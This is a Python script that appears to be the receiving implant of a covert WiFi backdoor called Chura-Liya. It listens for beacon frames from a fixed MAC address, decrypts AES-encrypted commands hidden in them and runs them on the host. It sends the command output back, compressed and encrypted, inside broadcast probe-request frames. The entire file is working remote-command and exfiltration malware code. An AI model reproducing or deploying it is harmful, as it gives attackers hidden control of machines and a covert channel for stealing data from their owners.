#!/usr/bin/python

# python receiver.py mon0
import zlib
import base64
from Crypto.Cipher import AES
from Crypto import Random
import subprocess
import logging
import time
import base64
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * 
import argparse
import hashlib

## Launcher options
parser = argparse.ArgumentParser(description='Chura-Liya Sender', prog='sender.py', usage='%(prog)s <Monitor Mode WiFi NIC> <Desired Password>')
parser.add_argument('Interface', type=str, help='WiFi NIC')
parser.add_argument('Password', type=str, help='Desired Password')
args = parser.parse_args()

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
unpad = lambda s : s[:-ord(s[len(s)-1:])]

class AESCipher:
    def __init__( self, key ):
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt( self, raw ):
        raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) ) 

    def decrypt( self, enc ):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))

interface=args.Interface
password=args.Password
aes=AESCipher(password)
conf.iface=interface

def executeHere(cmd):
	try:
		aescommand = base64.b64decode(cmd)
		command = aes.decrypt(aescommand)
	except Exception, e:
		print str(e)
		print "Received command with wrong AES key"
		return
	cmd = command
	if len(cmd)==0:
		print "Received command with wrong AES key"
		return
	print "Command: "+cmd
	cmd = cmd.split(" ")
	p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	out, err = p.communicate()
	out = out.rstrip("\n")
	print "Output: ",out
	print "Encrypted:",aes.encrypt(zlib.compress(out))
	print "Plain:",aes.decrypt(aes.encrypt(out))
	payload=aes.encrypt(zlib.compress(out))
	rlen=len(payload)
	if (rlen>255):
		line=payload
		n=240
		parts=[line[i:i+n] for i in range(0, len(line), n)]
		i=1
		for part in parts:
			try:
				payload="PART"+str(i)+"/"+str(len(parts))+"|"
				payload+=part
				probereq = RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2="11:22:33:44:55:66",addr3="ff:ff:ff:ff:ff:ff")/Dot11Elt(ID=0,info=payload)/Dot11Elt(ID=1,info="\x82\x84\x8b\x96")
				sendp(probereq, iface=interface, verbose=0)
			except Exception,e:
				print "Exception: "+str(e)
				print "Sending caught exception..."
				payload=aes.encrypt(zlib.compress(str(e)))
				exprobereq = RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2="11:22:33:44:55:66",addr3="ff:ff:ff:ff:ff:ff")/Dot11Elt(ID=0,info=payload)/Dot11Elt(ID=1,info="\x82\x84\x8b\x96")
				sendp(exprobereq, iface=interface, verbose=0)
			i+=1
		
	else:
		try:
			probereq = RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2="11:22:33:44:55:66",addr3="ff:ff:ff:ff:ff:ff")/Dot11Elt(ID=0,info=payload)/Dot11Elt(ID=1,info="\x82\x84\x8b\x96")
			sendp(probereq, iface=interface, verbose=0)
		except Exception,e:
			print "Exception: "+str(e)
			print "Sending caught exception..."
			payload=aes.encrypt(zlib.compress(str(e)))
			exprobereq = RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2="11:22:33:44:55:66",addr3="ff:ff:ff:ff:ff:ff")/Dot11Elt(ID=0,info=payload)/Dot11Elt(ID=1,info="\x82\x84\x8b\x96")
			sendp(exprobereq, iface=interface, verbose=0)

def packets(pkt):
	try:
		if pkt.haslayer(Dot11):
			if pkt.type == 0 and pkt.subtype == 8 and pkt.info == "" : # if management frame and beacon and SSID is blank
				if pkt.addr2 == "11:22:33:44:55:66":
#					print "AP MAC: %s | SSID: %s | Rates: %s" % (pkt.addr2, pkt.info, (pkt[Dot11Elt:2].info))
					#print ':'.join(x.encode('hex') for x in pkt[Dot11Elt:2].info)
					executeHere(str(pkt[Dot11Elt:2].info))
					return True
	except Exception,e:
		print "Something bad happened..."+str(e)


while 1:
	try:
		print "\nSniffing for packets..."
		sniff(iface=interface, stop_filter=packets, store=0)
	except Exception,e:
		print "Exception: "+str(e)
